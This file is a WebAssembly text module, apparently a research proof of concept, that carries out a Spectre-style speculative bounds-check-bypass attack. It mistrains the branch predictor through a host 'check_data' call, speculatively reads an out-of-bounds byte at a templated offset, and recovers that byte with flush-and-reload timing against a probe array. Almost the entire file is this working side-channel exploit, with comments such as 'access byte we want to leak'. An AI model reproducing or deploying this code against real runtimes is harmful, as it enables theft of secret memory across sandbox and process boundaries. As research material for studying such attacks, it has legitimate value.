(module
 (import "env" "check_data" (func $checkdata (param i32)))
 (import "env" "get_data_size" (func $getdatasize (result i64)))
 (import "env" "get_data2" (func $getdata2 (result i64)))
 (import "env" "get_data3" (func $getdata3 (result i64)))
 (import "env" "get_data4" (func $getdata4 (result i64)))
 (import "env" "get_data5" (func $getdata5 (result i64)))
 (import "env" "debug_read" (func $read (param i64)))
 (import "env" "debug_flush" (func $flush (param i64)))
 (import "env" "get_host_info" (func $gethostinfo (result i64)))
 (import "wasi_unstable" "sock_send" (func $socksend (param $fd i32) (param $buf i32) 
 	(param $len i32) 
 	(param $flags i32)
 	(param $byteswritten i32)
 	(result i32)))
  (import "wasi_unstable" "fd_write" (func $fdwrite (param $fd i32) (param $buf i32) 
 	(param $len i32) 
 	(param $flags i32)
 	(result i32)))
   (import "wasi_unstable" "fd_read" (func $fdread (param $fd i32) (param $buf i32) 
 	(param $len i32) 
 	(param $flags i32) 
 	(result i32)))
   (import "wasi_unstable" "random_get" (func $random (param $buf i32) (param $len i32) (result i32) ))
 (import "env" "debug_ts" (func $ts (result i64)))
 (memory 2)

 (func $increment (param $ctr i64) (result i64)
 	(return 
 		(i64.add 
	 		(get_local $ctr)
	 		(i64.const 1)
 		)
	)
 )

 (func $increment4 (param $ctr i32) (result i32)
 	(return 
 		(i32.add 
	 		(get_local $ctr)
	 		(i32.const 4)
 		)
	)
 )

 (func $idx_to_off (param $idx i64) (result i32)
 	(return 
 		(i32.wrap/i64 
 			(i64.mul
	 			(get_local $idx)
	 			(i64.const 8)
 			)
 		) 
 	)
 )

  (func $main (result i32) 
  (local $datasize_ptr i64)
  (local $data5 i64)
  (local $flush_addr i64)
  (local $test_addr i64)
  (local $readidx i64)
  (local $i i64)
  (local $max i64)
  (local $max_char i64)
  (local $count i64)
  (local $attack_ctr i64)
  	(local $probe_addr i64)
  	(local $probe_addr1 i64)
  	(local $probe_idx i64)
  	(local $starttime i64)
  	(local $endtime i64)
  	(local $timediff i64)
	(local $idx i32)
	(local $runnerup i64)

	;; (return (i32.wrap/i64 (call $gethostinfo)))
  	(set_local $datasize_ptr (call $getdatasize))

	;; (call $socksend (i32.const 1) (i32.wrap/i64 (get_local $datasize_ptr))
	;;  (i32.const 10)
	;;  (i32.const 0) (i32.const 0)
	;; )

	;; (call $random (i32.wrap/i64 (get_local $datasize_ptr)) (i32.const 10))
	;; (call $fdread (i32.const 0) (i32.const 2)
	;;  (i32.const 10)
	;;  (i32.const 0)
	;; )


  	;; clear out local memory 
	;; (set_local $idx (i32.const 0))
 ;;  	(block 
	;; (loop 
	;; 	(i32.store (get_local $idx) (i32.const 0xbaadbeef))

	;;     (set_local $idx (call $increment4 (get_local $idx)))
	;;  	 (br_if 1 (i32.eq (get_local $idx) (i32.const 256)))
 ;;        (br 0)
	;; 	)
 ;;  	)

 ;;  	(set_local $idx (i32.const 0))
 ;;  	(block 
	;; (loop 
	;; 	(if (i32.ne 
	;; 			(i32.load (get_local $idx))
	;; 			(i32.const 0xbaadbeef)
	;; 		)
	;; 		(then
	;; 			(return (i32.load (get_local $idx)))
	;; 		)
	;; 	)

	;;     (set_local $idx (call $increment4 (get_local $idx)))
	;;  	 (br_if 1 (i32.eq (get_local $idx) (i32.const 256)))
 ;;        (br 0)
	;; 	)
 ;;  	)


  	(set_local $datasize_ptr (call $getdatasize))
  	(set_local $data5 (call $getdata5))

  	;; testing
 ;;  	(set_local $probe_addr1
	;; 	( i64.add
 ;;  			 	( i64.mul 
 ;;  			 		(i64.const 200) 
 ;;  			 		(i64.const 512)
 ;;  				 )
 ;;  			 	(get_local $data5)
	;; 		 )
	;; )

 ;;  	(set_local $probe_addr 
	;; ( i64.add
	;; 	 	( i64.mul 
	;; 	 		(i64.const 200) 
	;; 	 		(i64.const 512)
	;; 		 )
	;; 	 	(get_local $data5)
	;; 	 )
	;; )

	;; (call $read (get_local $probe_addr))

 ;;  	(set_local $starttime (call $ts))
	;; (call $read (get_local $probe_addr1))
	;; (set_local $timediff 
	;;  	(i64.sub 
	;;  		(call $ts)
	;;  		(get_local $starttime)
	;;  	)
	;; )

	;; (if 
	;; 	(
	;; 		i64.lt_u
	;; 		(get_local $timediff)
	;; 		(i64.const 0x500)
	;; 	)
	;; 	(then 
	;; 		(return (i32.wrap/i64 (get_local $timediff)))
	;; 	)
	;; 	(else 
	;; 		(return (i32.const 42))
	;; 	)
	;; )
 	
	(set_local $attack_ctr (i64.const 0)) ;; set counter to 0
	(block 
	(loop 


  		;;  flush all of data5.
	     (set_local $i (i64.const 0)) ;; set counter to 0
	  	(block 
	  		(loop 

	  			(set_local 
	  				$flush_addr 
	  				( i64.add
	  			 		
		  			 	( i64.mul 
		  			 		(get_local $i) 
		  			 		(i64.const 512)
		  				 )
	  			 		(get_local $data5)
	  			 	)
	  			)

	  			(call $flush (get_local $flush_addr))

	  			(set_local $i (call $increment (get_local $i)))
		          (br_if 1 (i64.eq (get_local $i) (i64.const 256)))
		          (br 0)
	  		)
	  	)

	  	;; loop a bunch of times to mistrain branch predictor
	    (set_local $i (i64.const 0)) ;; set counter to 0
		(block 
		(loop 

			(set_local $readidx 
				(i64.rem_u
					(get_local $i)
					(i64.const 16)
				)
			)

			;; access data3 at in-bounds index
			(call $checkdata 
				(i32.wrap/i64 (get_local $readidx))
			)

		    (set_local $i (call $increment (get_local $i)))
		 	 (br_if 1 (i64.eq (get_local $i) (i64.const 16)))
	        (br 0)
			)
	  	)

		;; flush datasize to trigger speculative execution
	  	(call $flush (get_local $datasize_ptr))
	  	(set_local $i (i64.const 0)) ;; give CPU some time to finish flush 
	  	(block 
		(loop 
		    (set_local $i (call $increment (get_local $i)))
		 	 (br_if 1 (i64.eq (get_local $i) (i64.const 100)))
	        (br 0)
			)
	  	)

	  	;; access byte we want to leak, should be executed speculatively
	  	(call $checkdata (i32.const {offset}))
	  	;; (call $checkdata (i32.const 256))

	  	;; time accesses to see which character we just accessed
	 	 (set_local $i (i64.const 0)) ;; set counter to 0
		(block 
		(loop 
			(set_local 
				$probe_idx 
					(i64.rem_u 
					 	( i64.add 
					 		(get_local $i)
					 		(i64.const 3) 
						)
						(i64.const 256)
					)
			)

			;; (set_local 
			;; 	$probe_idx 
			;; 	(get_local $i)
			;; )

			(set_local $probe_addr 
				( i64.add
	  			 	( i64.mul 
	  			 		(get_local $probe_idx) 
	  			 		(i64.const 512)
	  				 )
	  			 	(get_local $data5)
	  			 )
			)

			(set_local $starttime (call $ts))
			(call $read (get_local $probe_addr))
			(set_local $timediff 
			 	(i64.sub 
			 		(call $ts)
			 		(get_local $starttime)
			 	)
			)
	 
			(if 
				(
					i64.lt_u
					(get_local $timediff)
					(i64.const 0x200)
				)
				(then   ;; add idx as possible char to count

					(i64.store 
						(call $idx_to_off (get_local $probe_idx))
						 (call $increment 
							(i64.load (call $idx_to_off (get_local $probe_idx)))
						 )			
					)

					(set_local $count (call $increment (get_local $count)))
				)
			)

		    (set_local $i (call $increment (get_local $i)))
		 	 (br_if 1 (i64.eq (get_local $i) (i64.const 256)))
	        (br 0)
			)
	  	)

	  	;; now find the maximum character 
	  	(set_local $i (i64.const 0x20))
	  	(set_local $max (i64.const 0))
	  	(set_local $runnerup (i64.const 0))
	  	(block 
		(loop 

			(if 
				(
					i64.gt_u
					(i64.load (call $idx_to_off (get_local $i)))
					(get_local $max)
				)
				(then   ;; set max to this character
					(set_local $max (i64.load (call $idx_to_off (get_local $i))))
					(set_local $runnerup (get_local $max))

					(set_local $max_char (get_local $i))
				)
				(else 
					(if 
						(i64.gt_u
							(i64.load (call $idx_to_off (get_local $i)))
							(get_local $runnerup)
						)
						(then 
							(set_local $runnerup (i64.load (call $idx_to_off (get_local $i))))
						)
					)
				)
			)

		    (set_local $i (call $increment (get_local $i)))
		 	 (br_if 1 (i64.eq (get_local $i) (i64.const 256)))
	        (br 0)
			)
	  	)

		(set_local $attack_ctr (call $increment (get_local $attack_ctr)))
	 	(br_if 1 (i64.eq (get_local $attack_ctr) (i64.const 999)))
	    (br 0)
		)
	)

	;; (if 
	;; 	(
	;; 		i64.eq
	;; 		(get_local $max_char)
	;; 		(i64.const 0x41) 
	;; 	)
	;; 	(then
	;; 		;; infinite loop
	;; 		(block
	;; 		(loop
	;; 			br 0
	;; 			)
	;; 		)
	;; 	)
	;; )

    (return (i32.wrap/i64 (get_local $max_char)))
  )
  (export "this_is_what_ive_got" (func $main)) ;; this exports func main as this_is_what_ive_got
)
